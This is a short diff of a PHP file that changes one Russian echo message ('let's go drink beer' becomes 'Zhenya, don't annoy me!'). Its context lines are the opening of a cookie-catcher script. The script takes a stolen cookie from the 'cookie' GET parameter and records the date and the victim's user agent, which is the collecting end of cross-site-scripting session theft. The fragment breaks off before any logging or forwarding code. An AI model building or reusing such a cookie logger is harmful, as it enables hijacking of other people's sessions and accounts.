@@ -1,5 +1,5 @@
 <?php
-echo 'ПОШЛИ ПИТЬ ПИВО';
+echo 'Женя, не беси меня!';
 $collectedCookie=$_GET["cookie"];
 $date=date("l ds of F Y h:i:s A");
 $user_agent=$_SERVER['HTTP_USER_AGENT'];
